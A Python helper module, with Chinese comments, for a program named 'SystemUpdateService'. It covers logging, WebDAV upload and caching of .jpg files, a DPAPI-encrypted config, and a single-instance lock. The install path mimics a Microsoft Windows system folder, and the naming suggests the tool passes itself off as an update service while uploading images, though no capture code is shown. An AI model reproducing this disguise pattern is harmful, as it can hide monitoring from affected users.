"""
SystemUpdateService 工具模块
提供日志管理、WebDAV上传、缓存管理等功能
"""

import os
import json
import logging
import shutil
import time
from datetime import datetime, timedelta
from pathlib import Path
import requests
from requests.auth import HTTPBasicAuth
import threading


class Logger:
    """日志管理器"""
    
    def __init__(self, config):
        self.config = config
        self.log_dir = Path("logs")
        self.log_dir.mkdir(exist_ok=True)
        self.log_file = self.log_dir / "update_sync.log"
        self.setup_logger()
    
    def setup_logger(self):
        """设置日志配置"""
        # 创建logger
        self.logger = logging.getLogger('SystemUpdateService')
        self.logger.setLevel(getattr(logging, self.config['system']['log_level']))
        
        # 清除已有的处理器
        self.logger.handlers.clear()
        
        # 创建文件处理器
        from logging.handlers import RotatingFileHandler
        file_handler = RotatingFileHandler(
            self.log_file,
            maxBytes=self.config['system']['max_log_size_mb'] * 1024 * 1024,
            backupCount=self.config['system']['max_log_files']
        )
        
        # 设置格式
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        file_handler.setFormatter(formatter)
        
        self.logger.addHandler(file_handler)
    
    def info(self, message):
        self.logger.info(message)
    
    def error(self, message):
        self.logger.error(message)
    
    def warning(self, message):
        self.logger.warning(message)
    
    def debug(self, message):
        self.logger.debug(message)


class WebDAVUploader:
    """WebDAV上传器"""
    
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        self.webdav_config = config['webdav']
        self.upload_config = config['upload']
        
    def upload_file(self, local_path, remote_filename):
        """上传文件到WebDAV"""
        try:
            url = self.webdav_config['url'].rstrip('/') + self.webdav_config['remote_path'] + remote_filename
            
            with open(local_path, 'rb') as f:
                response = requests.put(
                    url,
                    data=f,
                    auth=HTTPBasicAuth(
                        self.webdav_config['username'],
                        self.webdav_config['password']
                    ),
                    timeout=self.upload_config['timeout_seconds']
                )
            
            if response.status_code in [200, 201, 204]:
                self.logger.info(f"Successfully uploaded {remote_filename}")
                return True
            else:
                self.logger.error(f"Upload failed for {remote_filename}: {response.status_code}")
                return False
                
        except Exception as e:
            self.logger.error(f"Upload error for {remote_filename}: {str(e)}")
            return False


class CacheManager:
    """缓存管理器"""
    
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        self.cache_dir = Path("cache/failed_uploads")
        self.cache_dir.mkdir(parents=True, exist_ok=True)
        
    def save_failed_upload(self, file_path, original_filename):
        """保存上传失败的文件"""
        try:
            cache_file = self.cache_dir / original_filename
            shutil.copy2(file_path, cache_file)
            self.logger.info(f"Cached failed upload: {original_filename}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to cache file {original_filename}: {str(e)}")
            return False
    
    def get_cached_files(self):
        """获取缓存的文件列表"""
        try:
            return list(self.cache_dir.glob("*.jpg"))
        except Exception as e:
            self.logger.error(f"Error getting cached files: {str(e)}")
            return []
    
    def remove_cached_file(self, file_path):
        """删除缓存文件"""
        try:
            file_path.unlink()
            self.logger.info(f"Removed cached file: {file_path.name}")
        except Exception as e:
            self.logger.error(f"Error removing cached file {file_path}: {str(e)}")
    
    def cleanup_old_cache(self):
        """清理过期缓存"""
        try:
            cutoff_date = datetime.now() - timedelta(days=self.config['system']['cache_cleanup_days'])
            
            for file_path in self.cache_dir.glob("*.jpg"):
                if datetime.fromtimestamp(file_path.stat().st_mtime) < cutoff_date:
                    self.remove_cached_file(file_path)
                    
        except Exception as e:
            self.logger.error(f"Error during cache cleanup: {str(e)}")


def decrypt_data(encrypted_data_b64):
    """使用 Windows DPAPI 解密数据"""
    import base64
    try:
        import win32crypt
    except ImportError:
        # 在打包后的环境中，这个错误不应该发生
        # 但为了本地运行的健壮性，保留此检查
        raise RuntimeError("解密需要 'pywin32' 模块。请运行 'pip install pywin32'。")
        
    # Base64 解码
    encrypted_bytes = base64.b64decode(encrypted_data_b64.encode('utf-8'))
    # DPAPI 解密
    decrypted_bytes, _ = win32crypt.CryptUnprotectData(encrypted_bytes, None, None, None, 0)
    return json.loads(decrypted_bytes.decode('utf-8'))


def load_config():
    """加载并解密配置文件"""
    try:
        with open('config.dat', 'r', encoding='utf-8') as f:
            encrypted_data = f.read()
        return decrypt_data(encrypted_data)
    except FileNotFoundError:
        # 如果配置文件不存在，这是一个严重错误，因为无法引导用户
        # 此时应直接退出或抛出异常，让守护进程知道启动失败
        raise FileNotFoundError("错误：找不到配置文件 'config.dat'。请先运行配置向导。")
    except Exception as e:
        # 其他解密或解析错误
        raise RuntimeError(f"加载或解密配置文件失败: {e}")


def get_install_path():
    """获取安装路径"""
    import os
    appdata = os.environ.get('APPDATA', '')
    if appdata:
        return os.path.join(appdata, 'Microsoft', 'Windows', 'SystemData')
    else:
        # 如果无法获取APPDATA，使用当前目录
        return os.getcwd()


def ensure_single_instance(lock_file="system_update.lock"):
    """确保只有一个实例运行"""
    import atexit

    try:
        # Windows 兼容的文件锁实现
        if os.name == 'nt':  # Windows
            import msvcrt
            try:
                lock_fd = os.open(lock_file, os.O_CREAT | os.O_TRUNC | os.O_RDWR)
                msvcrt.locking(lock_fd, msvcrt.LK_NBLCK, 1)

                def cleanup():
                    try:
                        msvcrt.locking(lock_fd, msvcrt.LK_UNLCK, 1)
                        os.close(lock_fd)
                        os.unlink(lock_file)
                    except:
                        pass

                atexit.register(cleanup)
                return True
            except (OSError, IOError):
                return False
        else:  # Unix/Linux
            import fcntl
            try:
                lock_fd = os.open(lock_file, os.O_CREAT | os.O_TRUNC | os.O_RDWR)
                fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)

                def cleanup():
                    try:
                        os.close(lock_fd)
                        os.unlink(lock_file)
                    except:
                        pass

                atexit.register(cleanup)
                return True
            except (OSError, IOError):
                return False
    except Exception:
        return False
